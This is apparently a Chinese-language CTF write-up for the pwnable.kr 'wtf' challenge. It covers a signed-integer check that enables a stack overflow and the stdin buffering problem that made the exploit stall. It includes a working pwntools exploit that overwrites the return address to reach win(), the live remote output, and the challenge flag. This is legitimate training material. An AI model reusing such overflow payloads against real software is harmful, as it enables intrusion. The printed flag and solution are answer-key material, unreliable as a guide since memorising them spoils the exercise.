---
title: pwnable.kr-wtf
date: 2018-07-16 16:03:00
tags: [pwnable.kr,PWN]
categories: CTF
copyright: true
---
# 前言
一道代码很简单，但是却花了我好长时间的题目。挺有意思的，考察输入缓冲区的。
# 分析
还是先分析代码
```python
#!/usr/bin/python2
import os, sys, time
import subprocess
from threading import Timer

TIME = 5

class MyTimer():
	timer=None
	def __init__(self):
		self.timer = Timer(TIME, self.dispatch, args=[])
		self.timer.start()
	def dispatch(self):
		print 'program is not responding... something must be wrong :('
		os._exit(0)

def pwn( payload ):
	p = subprocess.Popen('./wtf', stdin=subprocess.PIPE, stdout=subprocess.PIPE)
	p.stdin.write( payload )
	output = p.stdout.readline()
	return output

if __name__ == '__main__':
	print '''
	---------------------------------------------------
	-              Shall we play a game?              -
	---------------------------------------------------
	
	Hey~, I'm a newb in this pwn(?) thing...
	I'm stuck with a very easy bof task called 'wtf'
	I think this is quite easy task, however my
	exploit payload is not working... I don't know why :(
	I want you to help me out here.
	please check out the binary and give me payload
	let me try to pwn this with yours.

	                            - Sincerely yours, newb
	'''
	sys.stdout.flush()
	time.sleep(1)

	try:
		sys.stdout.write('payload please : ')
		sys.stdout.flush()		
		payload = raw_input()
		payload = payload.decode('hex')
	except:
		print 'please give your payload in hex encoded format..'
		sys.stdout.flush()
		os._exit(0)

	print 'thanks! let me try if your payload works...'
	sys.stdout.flush()

	time.sleep(1)
	MyTimer()
	result = pwn( payload )
	if len(result) == 0:
		print 'your payload sucks! :('
		print 'I thought you were expert... what a shame :P'
		sys.stdout.flush()
		os._exit(0)

	print 'hey! your payload got me this : {0}\n'.format(result)
	print 'I admit, you are indeed an expert :)'
	sys.stdout.flush()


	sys.stdout.flush()
	os._exit(0)


```
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+10h] [rbp-30h]
  int v5; // [rsp+3Ch] [rbp-4h]

  __isoc99_scanf("%d", &v5);
  if ( v5 > 32 )
  {
    puts("preventing buffer overflow");
    v5 = 32;
  }
  my_fgets((__int64)&v4, v5);                   // Stack Overflow
  return 0;
}

__int64 __fastcall my_fgets(__int64 a1, int a2)
{
  bool v2; // al
  int v4; // [rsp+4h] [rbp-1Ch]
  char buf; // [rsp+1Bh] [rbp-5h]
  unsigned int i; // [rsp+1Ch] [rbp-4h]

  v4 = a2;
  for ( i = 0; ; ++i )
  {
    v2 = v4-- != 0;
    if ( !v2 )
      break;
    read(0, &buf, 1uLL);
    if ( buf == 10 )
      break;
    *(_BYTE *)(a1 + (signed int)i) = buf;
  }
  return i;
}

int win()
{
  return system("/bin/cat flag");
}
```
贴了`wtf.py`代码和`wtf`的部分反编译代码。`wtf.py`代码的逻辑很简单，只要输入一段`wtf`的利用代码并能成功利用即可。分析可执行程序`wtf`发现有一处栈溢出和一处有符号整数比较漏洞，而且有一个`win`函数可直接读取flag，所以利用很简单。但是，当把利用代码一次性输入进程序时，程序一直卡住，而分开两次输入就没有问题（即先输入size，再输入poc）。当时想了半天终于想到会不会是程序的输入缓冲区设置了全缓冲模式（即缓冲区装满后才会读取），但是怎么也没找到代码。不过后来试了一下成功了，用4096个字符填满了输入缓冲区，下面是poc
```python
from pwn import *
import time

context(arch='amd64')
shell_addr = 0x4005f4
#r = process('python ./wtf.py',shell=True)
r = remote('pwnable.kr',9015)
r.recvuntil('payload please : ')
poc = '-1'+'\n'*4094+'a'*0x38+p64(shell_addr)+'\n' 
r.sendline(poc.encode('hex'))
print r.recvall()
```
```
root@kali:/mnt/hgfs/work/pwn# python wtfpoc.py 
[+] Opening connection to pwnable.kr on port 9015: Done
[+] Receiving all data: Done (146B)
[*] Closed connection to pwnable.kr port 9015
thanks! let me try if your payload works...
hey! your payload got me this : I_H4T3_L1BC_BUFF3R1NG_5HIT_L0L


I admit, you are indeed an expert :)

```
从flag中也可看出确实考察的缓冲区
# 总结
题目代码简单，就是卡在了输入缓冲区上面，还是技术不到没能第一时间想到。
